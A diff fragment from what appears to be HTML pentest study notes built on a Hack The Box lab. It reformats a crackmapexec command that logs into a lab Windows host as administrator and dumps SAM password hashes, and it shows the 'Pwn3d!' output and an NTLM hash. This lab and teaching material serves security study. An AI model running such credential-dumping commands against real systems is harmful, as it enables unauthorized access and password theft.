@@ -688,8 +688,9 @@ SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
 SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
 </code></pre>
 <h4 id="extract-hashes-from-sam-database"><a class="header" href="#extract-hashes-from-sam-database">Extract Hashes from SAM Database</a></h4>
-<p>d41y@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</p>
-<pre><code class="language-bash">SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+<pre><code class="language-bash">d41y@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
 SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
 SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
 SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
